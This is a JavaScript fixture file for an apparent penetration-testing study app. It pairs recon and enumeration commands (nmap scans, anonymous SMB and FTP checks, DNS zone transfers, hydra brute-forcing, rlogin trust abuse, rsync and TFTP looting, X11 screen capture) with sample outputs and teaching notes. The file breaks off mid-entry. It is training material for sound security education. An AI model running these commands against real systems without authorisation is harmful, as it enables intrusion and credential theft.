/*!
 * obol data — study-fixtures.js — OBOL.STUDY_FIXTURES
 *
 * The one piece of the study cell NOT derivable from the packs: a representative sample of what each
 * move's output looks like, the one line that matters ("signal"), and a plain teach note about why.
 *
 * COHERENCE CONTRACT (enforced by tests/engine/study-smoke.js): every fixture pins `cmd` — the exact
 * command its `output` came from — and the Watch replay types THAT command above the result. `tool`
 * is its tool. The output is pure tool result: it never re-types a `$ command` echo, so the command
 * the learner sees and the output below it are always one real run, never a sample paired against a
 * different command. `signal` is one real line of the output (the evidence that matters).
 *
 * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear; they are merged in
 * from PRACTICE at the bottom. The verdict for each choice (correct / also-valid / locked) is computed
 * in study.js from the real requires — only the choice set and nuance coaching live here.
 *
 * Commands and outputs use consistent example values: target 10.10.10.10, domain acme.internal (ACME),
 * DC01, attacker 10.10.14.5, an internal segment 172.16.5.0/24. They are invocation + sample output
 * only — the methodology, not weaponised payloads.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.STUDY_FIXTURES = {

    // ============================ RECON ============================
    'nmap-fast-open-ports': {
      why: "This is the first thing you do on every box, and the one step you cannot skip: you cannot attack a service you have not found. The fast all-ports sweep catches the services people hide on odd numbers, a web app on 8080, SSH moved to 2222, that a default top-1000 scan walks straight past. Everything downstream (which service to enumerate, which exploit to try) is decided by what this returns, so start here, then run the slower version scan only against the ports it finds, never against all 65,535.",
      cmd: 'nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.10.10.10', tool: 'nmap',
      output: [
        'Nmap scan report for 10.10.10.10',
        'Host is up (0.021s latency).',
        'Not shown: 65532 closed tcp ports (reset)',
        'PORT     STATE SERVICE',
        '22/tcp   open  ssh',
        '80/tcp   open  http',
        '445/tcp  open  microsoft-ds',
      ].join('\n'),
      signal: '80/tcp   open  http',
      teach: 'Every open port is a door. A fast all-ports sweep first tells you what to look at (here SSH, a web server, and SMB) before you spend time on any one service.',
    },
    'nmap-version-scripts': {
      why: "Knowing a port is open tells you a door exists; knowing it runs \"Apache 2.4.49\" tells you which key to try. This scan fingerprints the exact software and version on each open port and runs nmap's safe default scripts, which pull banners, anonymous-login hints, and SMB signing status for free. Run it right after the fast sweep and only against the handful of open ports, because a specific version is a searchable CVE and the rest of your attack hinges on getting it right. Guessing the service from the port number, assuming 80 is just a plain website, is how people miss the easy win.",
      cmd: 'nmap -Pn -sC -sV -p 22,80,445 -oN scans/nmap-version.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE VERSION',
        '22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5',
        '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
        '|_http-title: Acme Corp Intranet',
        '445/tcp open  netbios-ssn Samba smbd 4.6.2',
      ].join('\n'),
      signal: '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
      teach: 'Versions are leads. "Apache 2.4.49" is a specific, searchable build, many such versions have a public CVE. Always pull the version before deciding how to attack a service.',
    },
    'nmap-vuln-scripts': {
      why: "When you want nmap itself to point at known holes, the vuln script category runs detection checks (EternalBlue, common SMB, HTTP and RDP CVEs) against the open ports. It is a fast way to surface a lead, but it only detects, it does not exploit, and it false-positives, so read a VULNERABLE line as \"go verify this\", not \"you are in\". Reach for it after the version scan when a service looks old or interesting; do not lean on it as your plan, because a clean result just means nmap's small script set recognised nothing, not that the box is safe. Most of the category is safe detection, but a few scripts are tagged intrusive, so keep it scoped to the open ports rather than firing the whole set blind.",
      cmd: 'nmap -Pn -sV --script vuln -p 80 -oN scans/nmap-vuln.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT   STATE SERVICE VERSION',
        '80/tcp open  http    Apache httpd 2.4.49 ((Unix))',
        '| http-vuln-cve2021-41773:',
        '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
        '|_    References: https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
      ].join('\n'),
      signal: '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
      teach: 'The vuln scripts run safe-ish checks that flag known CVEs on the open ports. Treat a VULNERABLE line as a strong lead to verify, not a guaranteed win, scripts can false-positive, so confirm before you commit.',
    },
    'nmap-udp-top': {
      why: "TCP is only half the attack surface, and UDP is the half everyone forgets. SNMP (161), DNS (53), TFTP (69) and IKE/VPN (500) all live on UDP, and any one of them can be the way in, an SNMP \"public\" string alone can dump credentials. UDP has no handshake to confirm a port, so scanning is slow and noisy with false \"open|filtered\" results; you check only the top ports and run it alongside your TCP work rather than waiting on it. Do this on every box, because the UDP-only service is the classic \"stuck for hours\" lesson.",
      cmd: 'sudo nmap -Pn -sU --top-ports 20 --open -oN scans/nmap-udp-top20.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE',
        '53/udp  open  domain',
        '161/udp open  snmp',
      ].join('\n'),
      signal: '161/udp open  snmp',
      teach: 'TCP is only half the surface. A quick UDP sweep of the top ports finds the services people forget (SNMP on 161, DNS on 53, TFTP on 69), and each is its own way in.',
    },
    'recon-smb-anon': {
      why: "SMB on 445 is the busiest port in a Windows network, and the first thing to try is the free one: log in as nobody. An anonymous session costs nothing and routinely hands you a readable share full of configs or scripts, the domain name, and whether SMB signing is off (which matters later for relaying). Do this the moment you see 445, before any brute-forcing, because why guess a password when the box might just let you in. A readable share like \"Profiles\" or \"Backups\" is somewhere to go hunting right away.",
      cmd: "nxc smb 10.10.10.10 -u '' -p '' --shares", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  FILE01  [*] Windows Server 2019 Build 17763 (name:FILE01) (domain:acme.internal) (signing:False)',
        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\: (Guest)',
        'SMB  10.10.10.10  445  FILE01  Share       Permissions   Remark',
        'SMB  10.10.10.10  445  FILE01  IPC$                      Remote IPC',
        'SMB  10.10.10.10  445  FILE01  Profiles    READ',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  FILE01  Profiles    READ',
      teach: 'An anonymous ("-u \'\' -p \'\'") SMB check costs nothing and often hands you a readable share and the domain name. A READ share like Profiles is a place to hunt for files; the banner also leaks that signing is off.',
    },
    'recon-web-triage': {
      why: "A web app is the single richest attack surface on the exam, but before you fuzz anything you need to know what you are looking at. Fingerprinting the stack in one request (server, language, framework, CMS, page title) decides which exploits and which wordlists are even worth trying, hunting WordPress plugins on a .NET site is wasted time. Run this the instant you see 80 or 443, right after the version scan. It is the cheap step that aims every expensive step after it.",
      cmd: 'whatweb -a3 http://10.10.10.10', tool: 'whatweb',
      output: [
        'http://10.10.10.10 [200 OK] Apache[2.4.49], HTTPServer[Unix][Apache/2.4.49 (Unix)],',
        'IP[10.10.10.10], PHP[7.4.3], Title[Acme Corp Intranet], X-Powered-By[PHP/7.4.3]',
      ].join('\n'),
      signal: 'Apache[2.4.49]',
      teach: 'whatweb fingerprints the stack in one request, web server, language, CMS, title. Knowing it is Apache 2.4.49 + PHP 7.4 steers which exploits and wordlists make sense before you touch the site further.',
    },
    'recon-dns': {
      why: "A nameserver is meant to answer a zone transfer only to its own backup servers, but admins leave AXFR open to the world constantly, and when they do, one request hands you every hostname in the domain: internal apps, dev boxes, mail servers, names you would otherwise have to brute-force. It costs one command and makes almost no noise, so it is always worth trying when you see port 53. If AXFR is refused (the common case) you have lost nothing and fall back to brute-forcing records. Every name you collect is a new target and a new vhost to fuzz.",
      cmd: 'dig axfr acme.internal @10.10.10.10', tool: 'dig',
      output: [
        '; <<>> DiG 9.18.12 <<>> axfr acme.internal @10.10.10.10',
        'acme.internal.          604800 IN SOA dc01.acme.internal. admin.acme.internal. 3 604800 86400',
        'dc01.acme.internal.     604800 IN A   10.10.10.10',
        'dev.acme.internal.      604800 IN A   10.10.10.25',
        'intranet.acme.internal. 604800 IN A   10.10.10.30',
      ].join('\n'),
      signal: 'intranet.acme.internal. 604800 IN A   10.10.10.30',
      teach: 'A DNS zone transfer (AXFR) that succeeds hands you the whole internal name map in one request, every host and subdomain the admin forgot to lock down. Those new names are new targets.',
    },
    'recon-snmp': {
      why: "SNMP on UDP 161 is a quiet goldmine because of one default nobody changes: the \"public\" community string. If it answers, you can read the device's running processes, network interfaces, installed software, and on misconfigured hosts actual credentials, with no login at all. Reach for it whenever a UDP scan shows 161 open; it is high value for almost no effort. People skip UDP and never find this, which is exactly why it keeps working.",
      cmd: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10', tool: 'onesixtyone',
      output: [
        'Scanning 1 hosts, 3220 communities',
        '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
      ].join('\n'),
      signal: '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
      teach: 'An SNMP community string of "public" is a default nobody changed. onesixtyone confirms it answers; with it (via snmpwalk) you can read running processes, users, and sometimes credentials, no login required.',
    },
    'recon-ike-vpn': {
      why: "UDP 500 is an IKE endpoint, the handshake service for an IPsec VPN. Enumerating it confirms the VPN is there and can leak the vendor and supported transforms, and an aggressive-mode handshake can hand you a hash to crack offline for a way into the internal network. It is niche, so reach for it only when 500/udp shows up; most boxes will not have it. When it does appear it is often the intended path in, and easy to walk past if you ignore UDP.",
      cmd: 'sudo ike-scan -M 10.10.10.10', tool: 'ike-scan',
      output: [
        'Starting ike-scan 1.9.5 with 1 hosts',
        '10.10.10.10  Main Mode Handshake returned',
        '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
        'Ending ike-scan: 1 hosts scanned, 1 returned handshake',
      ].join('\n'),
      signal: '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
      teach: 'An IKE/IPsec VPN on UDP 500 reveals its crypto. A dated 3DES/SHA1/PSK config is a finding on its own, and if the server also allows Aggressive Mode (ike-scan -A) it will hand back a PSK hash you can crack offline.',
    },
    'recon-finger': {
      why: "Finger (port 79) is ancient and nearly extinct, but when it is open it does one thing very well for you: it confirms real usernames and shows who is logged in. A confirmed list of accounts is the raw material for a password spray or a brute-force, so finger turns \"I am guessing names\" into \"I am guessing passwords for names I know are real\". You will rarely see it; when you do, enumerate it first, because valid usernames are worth more than almost anything else this early.",
      cmd: 'finger @10.10.10.10', tool: 'finger',
      output: [
        'Login     Name          Tty   Idle  Login Time',
        'root      root          *:0     1d  Mon 09:14',
        'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
      ].join('\n'),
      signal: 'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
      teach: 'The finger service (port 79) is ancient but still appears on old Unix boxes. It leaks real usernames and who is logged in, bmurphy is a confirmed account to spray or brute.',
    },
    'recon-vnc': {
      why: "VNC is a remote-desktop service, and the enumeration question is blunt: does it even ask for a password? A server set to \"None\" security is an unauthenticated desktop, you connect and you are looking at the box's screen. Even when it wants a password, VNC passwords are capped at eight characters and crack fast. Check this whenever you see a 59xx port; it is one of the rare services where enumeration and full compromise can be the same step.",
      cmd: 'nmap -p 5900,5901 --script vnc-info,realvnc-auth-bypass 10.10.10.10', tool: 'nmap',
      output: [
        'PORT     STATE SERVICE',
        '5900/tcp open  vnc',
        '| vnc-info:',
        '|   Protocol version: 3.8',
        '|   Security types:',
        '|_    None (1) - no password required',
      ].join('\n'),
      signal: '|_    None (1) - no password required',
      teach: 'A VNC server that offers "None" security is an unauthenticated remote desktop, connect and you are on the box\'s screen. Even when it wants a password, VNC passwords are short and crackable.',
    },
    'recon-smtp': {
      why: "Every password attack later in the engagement is only as good as the username list behind it, and SMTP hands you a way to verify that list without a single login attempt. Port 25 answering VRFY, EXPN, or a telltale RCPT response is a free oracle: feed it guessed names and it tells you which ones are real, turning a noisy spray into a targeted one. The banner usually leaks the mail software and sometimes the internal hostname as a bonus. Reach for it the moment 25 is open, before you spray anything.",
      cmd: 'smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10', tool: 'smtp-user-enum',
      output: [
        'Starting smtp-user-enum v1.2',
        '10.10.10.10: root exists',
        '10.10.10.10: bmurphy exists',
        '10.10.10.10: nonexistent does not exist',
      ].join('\n'),
      signal: '10.10.10.10: bmurphy exists',
      teach: 'An SMTP server that answers VRFY confirms which usernames are real. A confirmed user list is the raw material for a password spray or a brute, you stop guessing names and start guessing passwords.',
    },
    'recon-ftp': {
      why: "FTP's first test is free and almost always worth it: try the anonymous login. Boxes leave it open constantly, and an anonymous session routinely exposes a directory of source code, backups, or config files with credentials in them, a foothold sitting in plain sight. Do this the moment you see port 21, before brute-forcing a real account. Download everything you can read and look through it, because the win is usually in a file, not in the service itself.",
      cmd: "nxc ftp 10.10.10.10 -u anonymous -p ''", tool: 'nxc',
      output: [
        'FTP  10.10.10.10  21  FTP01  [*] Banner: 220 (vsFTPd 3.0.3)',
        'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
        'FTP  10.10.10.10  21  FTP01  -rw-r--r-- 1 ftp ftp 1024 Jan 08 09:12 backup.zip',
      ].join('\n'),
      signal: 'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
      teach: 'Anonymous FTP is a free login, always test it. A readable file like backup.zip often holds source, configs, or credentials; download everything and look through it.',
    },
    'recon-mail': {
      why: "Once you hold a mailbox credential, reading the mail is itself an attack: people send passwords, VPN configs, and password-reset links to each other, and the inbox is where that history lives. This step logs into POP3 or IMAP with creds you already recovered and pulls the messages so you can mine them. Reach for it after you have a working credential and see 110/143/993/995 open; the mailbox often hands you the next credential or the next host.",
      cmd: 'nmap -sV -p 110,143,993,995 --script pop3-capabilities,pop3-ntlm-info 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE',
        '110/tcp open  pop3',
        '143/tcp open  imap',
        '|_pop3-capabilities: USER TOP UIDL',
        '| pop3-ntlm-info:',
        '|_  Domain: ACME',
      ].join('\n'),
      signal: '|_  Domain: ACME',
      teach: 'Mail services leak more than you expect: capabilities, and via NTLM auth the internal domain name (ACME). With a valid mailbox credential you can read mail for secrets, reset links, and internal contacts.',
    },
    'rdp-enum': {
      why: "RDP on 3389 is both a service to check and, with a working credential, your way onto the desktop. Enumeration answers two questions: is Network Level Authentication required (which blocks some attacks), and do the credentials you already hold actually log in here. A \"Pwn3d!\" against RDP means an interactive session is waiting, so always confirm which creds work against which service, a password that fails on SMB can still open RDP. Check it whenever 3389 is open and you have any credential to test.",
      cmd: "nxc rdp 10.10.10.10 -u bmurphy -p 'Summer2024!'", tool: 'nxc',
      output: [
        'RDP  10.10.10.10  3389  TARGET  [*] Windows 10 / Server 2019 Build 17763 (name:TARGET) (domain:ACME)',
        'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
      ].join('\n'),
      signal: 'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
      teach: '"Pwn3d!" on an RDP check means the credentials you tested actually log in, you have an interactive desktop waiting (connect with xfreerdp). Always confirm which creds work against which service.',
    },
    'nfs-enum': {
      why: "NFS (111 and 2049) shares a filesystem over the network, and the enumeration step asks what is exported and to whom. An export shared with \"*\" is readable by anyone who mounts it, and if it is exported with no_root_squash you can write files as root on it, which is a direct privilege-escalation primitive, not just a file read. Reach for it the moment you see those ports: mount the share, read what you can, and check the squash setting, because an NFS misconfiguration is often the foothold and the root in one service.",
      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
      output: [
        'Export list for 10.10.10.10:',
        '/srv/home    *',
        '/var/backups 10.10.10.0/24',
      ].join('\n'),
      signal: '/srv/home    *',
      teach: 'An NFS export shared with "*" is readable by anyone who mounts it. Mount it locally and you can read other users\' files, and often, with a matching UID, write them too. A classic foothold and privesc in one.',
    },

    'recon-telnet': {"why": "You will not meet Telnet often, and where you do it is almost always something old or embedded: a legacy Unix host, a switch, a router, a printer. That context is the whole play. Such devices ship with documented factory logins and are rarely patched, so the quickest win is trying the vendor's default password before you reach for a brute-force at all. The banner the service prints on connect is itself the lead, naming the firmware or OS so you know which defaults apply. And because the protocol is plaintext, a password you already looted is worth one test here: reuse across a service this weak is common and costs a single connection.", "cmd": "telnet 10.10.10.10", "tool": "telnet", "output": "Trying 10.10.10.10...\nConnected to 10.10.10.10.\nEscape character is '^]'.\n\nACME-RTR (BusyBox v1.29.3) built-in shell\nACME-RTR login:", "signal": "ACME-RTR (BusyBox v1.29.3) built-in shell", "teach": "The banner named the firmware (BusyBox on an ACME router), so before any brute-force try that device's documented default login. Telnet is plaintext, so a password you already hold is also worth a single test.", "leadup": [{"key": "scan", "label": "The scan found 23", "steps": [{"title": "Spot the telnet port", "tool": "nmap", "where": "local", "cmd": "nmap -p 23 <target>", "out": "PORT   STATE SERVICE\n23/tcp open  telnet", "sig": "23/tcp open  telnet", "teach": "Telnet on something modern is unusual; on legacy or embedded gear it is a straight shot at a default login."}]}, {"key": "fingerprint", "label": "The version scan named a device", "steps": [{"title": "Fingerprint the service", "tool": "nmap", "where": "local", "cmd": "nmap -sV -p 23 <target>", "out": "23/tcp open  telnet  Linux telnetd", "sig": "Linux telnetd", "teach": "A named telnetd, or an appliance banner, tells you which family of default credentials to try first."}]}], "how": {"lead": "Telnet rewards the lazy move first: read the banner, try the documented default, and only then brute. Every step is one connection.", "items": [{"t": "Read the banner on connect", "d": "The first thing a telnet service prints often names the device, firmware, or OS, and that name maps directly to a known default login. Read it before you try anything.", "demo": [{"run": "telnet <target> 23", "out": "Connected to <target>.\nWelcome to ACME-SW (Cisco IOS 15.2)\nUsername:", "sig": "Cisco IOS 15.2"}], "note": "A Cisco IOS banner points you straight at that platform's documented default credentials."}, {"t": "Try the documented default login", "d": "Embedded gear ships with factory credentials that are published online. Test the one pair the banner implies before any wordlist; it is usually root, admin, or the vendor name with a known password.", "demo": [{"run": "hydra -l admin -p admin telnet://<target>", "out": "[23][telnet] host: <target>   login: admin   password: admin", "sig": "login: admin   password: admin"}], "note": "One documented pair confirmed; no wordlist needed when the default was never changed."}, {"t": "Test a looted password for reuse", "d": "Telnet is plaintext and these hosts are weakly managed, so a password you recovered elsewhere is worth a single test here.", "demo": [{"run": "hydra -l root -p 'Summer2024!' telnet://<target>", "out": "[23][telnet] host: <target>   login: root   password: Summer2024!", "sig": "login: root   password: Summer2024!"}], "note": "A reused password turns one captured credential into a second foothold."}, {"t": "Brute a known user list last", "d": "Only when defaults and reuse fail, run a small wordlist. Telnet rarely locks out, but it is slow, so keep the list tight and the threads low.", "demo": [{"run": "hydra -L users.txt -P top100.txt telnet://<target> -t 4", "out": "[23][telnet] host: <target>   login: operator   password: operator1", "sig": "login: operator   password: operator1"}], "note": "A hit here is a cleartext login you can use immediately."}, {"t": "On Windows telnet, pull the domain", "d": "A Windows Telnet Server answers an NTLM probe that leaks the hostname and domain for free, useful AD recon before you even log in.", "demo": [{"run": "nmap -p23 --script telnet-ntlm-info <target>", "out": "| telnet-ntlm-info:\n|   NetBIOS_Domain_Name: ACME\n|   DNS_Computer_Name: WS01.acme.internal", "sig": "NetBIOS_Domain_Name: ACME"}], "note": "The domain name alone feeds your AD enumeration."}]}},
    'recon-rservices': {"why": "These services are a relic of a time when the network itself was the password: a host decides whether to trust you from your source address and username, not from a secret. That design is the attack. When 512, 513, or 514 are open you are really asking one question, does this box trust someone it should not, and the answer lives in a .rhosts file or /etc/hosts.equiv you never get to read directly. A single line of plus-plus in either means the host trusts every user on every host, so an rlogin as root walks straight in. Test the trust the instant these ports appear, because when it is loose there is no credential to crack and nothing to brute, you are simply already in.", "cmd": "rlogin -l root 10.10.10.10", "tool": "rlogin", "output": "Last login: Mon Jan  8 09:02 from workstation\nFreeBSD 9.1-RELEASE (GENERIC)\n\nroot@target:~#", "signal": "root@target:~#", "teach": "No password prompt appeared: the host's hosts.equiv or root's .rhosts trusts your connection, so rlogin dropped you to a root shell. This is trust-based access, not a credential, so capture proof now before the trust is tightened.", "leadup": [{"key": "scan", "label": "The scan found the r-services", "steps": [{"title": "Spot 512 to 514", "tool": "nmap", "where": "local", "cmd": "nmap -p 512,513,514 <target>", "out": "512/tcp open  exec\n513/tcp open  login\n514/tcp open  shell", "sig": "513/tcp open  login", "teach": "exec, login and shell on 512 to 514 are the Berkeley r-services; they authenticate by host trust, so the first test is whether that trust includes you."}]}, {"key": "legacy", "label": "A legacy Unix fingerprint", "steps": [{"title": "Fingerprint the login service", "tool": "nmap", "where": "local", "cmd": "nmap -sV -p 513 <target>", "out": "513/tcp open  login?  rlogind", "sig": "rlogind", "teach": "rlogind confirms the trust-login service; install the rsh-client package on your box to speak to it."}]}], "how": {"lead": "r-services are about trust, not passwords. Probe whether the host trusts you, then use the trust.", "items": [{"t": "Install the Berkeley client first", "d": "Kali does not ship these clients by default. rsh-client provides rlogin, rsh and rexec; without it the commands are simply not found.", "demo": [{"run": "sudo apt install -y rsh-client", "out": "Setting up rsh-client ...\nupdate-alternatives: using /usr/bin/rsh.real to provide /usr/bin/rsh", "sig": "Setting up rsh-client"}], "note": "Now rlogin, rsh and rexec exist on your box and can speak to the target."}, {"t": "Attempt a password-free rlogin as root", "d": "If root's .rhosts or hosts.equiv trusts you, rlogin asks for nothing and drops you to a shell. Try root first, then any username you know.", "demo": [{"run": "rlogin -l root <target>", "out": "Last login: Mon Jan  8 from workstation\nroot@target:~# id\nuid=0(root) gid=0(root)", "sig": "uid=0(root)"}], "note": "uid=0 with no password is the whole attack: the host trusted your connection."}, {"t": "Run one command over rsh", "d": "rsh executes a single command under the same trust, handy to confirm access without an interactive session.", "demo": [{"run": "rsh -l root <target> id", "out": "uid=0(root) gid=0(root) groups=0(root)", "sig": "uid=0(root)"}], "note": "A returned uid=0 proves the trust covers you; escalate to a full rlogin next."}, {"t": "Try other trusted users", "d": "The trust may name a service account rather than root. Spray a short list of common usernames through rsh; each password-free success is a foothold.", "demo": [{"run": "for u in root bin daemon oracle; do rsh -l $u <target> id 2>/dev/null; done", "out": "uid=1001(oracle) gid=1001(oracle) groups=1001(oracle)", "sig": "uid=1001(oracle)"}], "note": "oracle was trusted even though root was not, still a foothold to build on."}]}},
    'recon-rsync': {"why": "rsync on 873 is a sharing service people forget is a sharing service. It was set up to move backups or sync a web root, and whoever configured it almost never locked the module down, so it answers an anonymous client with a directory it was only ever meant to serve internally. The value is in what those modules are: a backups module is last night's data, a web module is the site's source with a database password in a config file, a home module is someone's SSH key. List the modules first, because that single command tells you the shape of the box, then pull the one that matters. A module you can also write to is better still, it drops files wherever on disk that module points.", "cmd": "rsync --list-only rsync://10.10.10.10/", "tool": "rsync", "output": "backups          Nightly server backups\nweb              Production web root\nhome             User home directories", "signal": "web              Production web root", "teach": "The daemon advertised its modules and what each one is. 'web' is the live site's files (expect a config with database creds), 'home' holds SSH keys. Pull the interesting one with rsync -av, then grep it offline.", "leadup": [{"key": "scan", "label": "The scan found 873", "steps": [{"title": "Spot the rsync port", "tool": "nmap", "where": "local", "cmd": "nmap -p 873 <target>", "out": "873/tcp open  rsync", "sig": "873/tcp open  rsync", "teach": "873 is an rsync daemon; list its modules before assuming you need a credential, because many are anonymous."}]}, {"key": "version", "label": "The version scan named rsyncd", "steps": [{"title": "Fingerprint the daemon", "tool": "nmap", "where": "local", "cmd": "nmap -sV -p 873 <target>", "out": "873/tcp open  rsync  (protocol version 31)", "sig": "protocol version 31", "teach": "A bare rsync protocol banner with no auth challenge is the common case; go straight to listing modules."}]}], "how": {"lead": "rsync is list, then pull, then check write. Three commands tell you everything.", "items": [{"t": "List the modules", "d": "A trailing slash and no module name asks the daemon for its share list. Each line is a module you may be able to read or write.", "demo": [{"run": "rsync --list-only rsync://<target>/", "out": "src              Application source\nconf             Server configs", "sig": "conf             Server configs"}], "note": "conf is exactly where database and service passwords live."}, {"t": "Peek inside before pulling", "d": "List a module's contents so you know what you are taking and can grab just the file you need on a large share.", "demo": [{"run": "rsync --list-only rsync://<target>/conf/", "out": "-rw-r--r--        1,240 2024/01/08 12:34:56 db.php\n-rw-r--r--          480 2024/01/08 12:35:10 .env", "sig": ".env"}], "note": "A .env file is almost always secrets in plaintext."}, {"t": "Pull the module down", "d": "Sync the share into your loot directory, then grep it offline for passwords, keys and hostnames.", "demo": [{"run": "rsync -av rsync://<target>/conf/ loot/rsync-conf/", "out": "receiving incremental file list\ndb.php\n.env\n\nsent 112 bytes  received 1,984 bytes", "sig": "receiving incremental file list"}], "note": "Everything readable is now local; grep -ri password loot/ does the rest."}, {"t": "Test whether you can write", "d": "Upload a marker. A module exported read-write lets you drop files wherever it points, authorized_keys in a home module, a webshell in a web module.", "demo": [{"run": "echo test > /tmp/w.txt && rsync /tmp/w.txt rsync://<target>/web/w.txt", "out": "sent 71 bytes  received 35 bytes  212.00 bytes/sec\ntotal size is 5  speedup is 0.05", "sig": "total size is 5"}], "note": "No permission error means the module is writable; that is a foothold, not just loot."}]}},
    'recon-tftp': {"why": "TFTP punishes you for not knowing your target. It cannot list anything, so a scan proving 69 is open tells you a door exists but not what is behind it, and a failed download means only that you guessed the wrong name. That makes device context everything: TFTP lives on routers, switches, IP phones and PXE boot servers, and each keeps files at predictable, documented names. A Cisco keeps running-config and startup-config; a phone keeps a SIP config with its line password; a boot server keeps kickstart files with a root hash. Work out what the box is, then fetch the names that device is known to serve, because those files routinely hand you management passwords and SNMP strings in plaintext.", "cmd": "nmap -sU -p69 --script tftp-enum 10.10.10.10", "tool": "nmap", "output": "PORT   STATE SERVICE\n69/udp open  tftp\n| tftp-enum:\n|   /running-config\n|_  /startup-config", "signal": "|   /running-config", "teach": "The NSE probe guessed two served filenames. running-config on a network device holds enable passwords and SNMP strings; fetch it with tftp get and read it offline.", "leadup": [{"key": "udp", "label": "The UDP scan found 69", "steps": [{"title": "Check the top UDP ports", "tool": "nmap", "where": "local", "cmd": "sudo nmap -sU -p 69 <target>", "out": "69/udp open  tftp", "sig": "69/udp open  tftp", "teach": "TFTP is UDP and only shows up in a UDP scan; once you see 69, the game is knowing which filenames to ask for."}]}, {"key": "device", "label": "The box is a network device", "steps": [{"title": "Fingerprint the service", "tool": "nmap", "where": "local", "cmd": "nmap -sV -p 69 <target>", "out": "69/udp open  tftp  SolarWinds Free TFTP Server", "sig": "SolarWinds Free TFTP Server", "teach": "A named TFTP server, or a device banner elsewhere, tells you which documented filenames to try."}]}], "how": {"lead": "TFTP has no listing, so you work by known names. Probe, then fetch, then read.", "items": [{"t": "Probe common names with nmap", "d": "tftp-enum tries a built-in list of well-known filenames so you are not guessing entirely blind.", "demo": [{"run": "nmap -sU -p69 --script tftp-enum <target>", "out": "| tftp-enum:\n|   /running-config\n|   /startup-config", "sig": "/running-config"}], "note": "The script confirmed a Cisco-style config is served; that file holds enable and SNMP secrets."}, {"t": "Fetch a file by name", "d": "tftp get pulls one named file to your box. There is no overwrite prompt and no listing, so spell the name exactly.", "demo": [{"run": "tftp <target> -c get running-config", "out": "Received 4096 bytes in 0.3 seconds", "sig": "Received 4096 bytes"}], "note": "A byte count means the file existed and is now local; a timeout would mean the name was wrong."}, {"t": "Read the loot for secrets", "d": "Device configs store passwords, community strings and hashes in near-plaintext. grep the file you pulled.", "demo": [{"run": "grep -iE 'password|snmp|secret' running-config", "out": "enable secret 5 $1$aK7x$9cTjUIEqNGurQiFU.ZeCi1\nsnmp-server community private RW", "sig": "snmp-server community private RW"}], "note": "A writable SNMP community (private RW) is its own foothold, and the enable hash cracks offline."}, {"t": "Try device-specific names by hand", "d": "Phones, PXE servers and appliances each keep files at documented paths the generic script misses. Match the names to what the box is.", "demo": [{"run": "tftp <target> -c get SEPDefault.cnf", "out": "Received 1180 bytes in 0.1 seconds", "sig": "Received 1180 bytes"}], "note": "SEPDefault.cnf is a Cisco phone config; it carries the SIP line password in the clear."}]}},
    'recon-x11': {"why": "An open X server collapses the usual gap between the network and the user. Normally you compromise a host and then hunt for what a person did on it; a 6000 port with access control disabled lets you watch that person directly, right now, over the network. You are not running code on the box, you are sitting at its screen. That is why it is dangerous and a finding on its own: you can photograph whatever is open, a terminal with a sudo session, a password manager, a config editor, and you can read every keystroke as it is typed, which means the next password the user enters is yours. Check it whenever 6000 and up is open, because it is one of the few services where simply looking is already the compromise.", "cmd": "nmap -p6000 --script x11-access 10.10.10.10", "tool": "nmap", "output": "PORT     STATE SERVICE\n6000/tcp open  X11\n| x11-access:\n|_  X server access is granted", "signal": "|_  X server access is granted", "teach": "'Access is granted' means the display accepts any client with no cookie. Screenshot it with xwd and log keystrokes: everything on that desktop, and everything typed next, is readable.", "leadup": [{"key": "scan", "label": "The scan found 6000", "steps": [{"title": "Spot the X11 port", "tool": "nmap", "where": "local", "cmd": "nmap -p 6000 <target>", "out": "6000/tcp open  X11", "sig": "6000/tcp open  X11", "teach": "6000 is display :0; the only question left is whether it checks a cookie, which the x11-access script answers."}]}, {"key": "range", "label": "Several 60xx ports", "steps": [{"title": "Scan the X11 range", "tool": "nmap", "where": "local", "cmd": "nmap -p 6000-6005 <target>", "out": "6000/tcp open  X11\n6001/tcp open  X11", "sig": "6001/tcp open  X11", "teach": "Each 600N port is display :N; a multi-user or multi-head host exposes several, and any one with access off is a way in."}]}], "how": {"lead": "X11 open means you can see and drive the desktop. Confirm access, capture the screen, then read the keys.", "items": [{"t": "Confirm access control is off", "d": "x11-access reports whether the server grants unauthenticated clients. 'granted' means no magic cookie is required.", "demo": [{"run": "nmap -p6000 --script x11-access <target>", "out": "| x11-access:\n|_  X server access is granted", "sig": "X server access is granted"}], "note": "Granted access is the whole vulnerability; everything else just uses it."}, {"t": "Screenshot the live desktop", "d": "xwd dumps the root window of a remote display; convert turns the dump into a PNG you can open.", 